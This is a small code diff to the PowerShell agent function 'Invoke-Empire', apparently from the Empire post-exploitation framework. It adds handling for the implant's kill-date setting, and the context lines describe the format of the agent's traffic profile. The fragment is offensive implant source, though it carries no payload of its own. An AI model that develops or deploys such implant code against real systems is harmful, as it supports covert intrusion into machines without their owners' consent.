@@ -114,6 +114,10 @@ function Invoke-Empire {
         $script:KillDate = (Get-Date).AddDays($KillDays).ToString('MM/dd/yyyy')
     }
 
+    if($KillDate -ne "REPLACE_KILLDATE" -and $KillDate -ne $null) {
+        $script:KillDate = $KillDate
+    }
+
     # get all the headers/etc. in line for our comms
     #   Profile format:
     #       uris(comma separated)|UserAgent|header1=val|header2=val2...
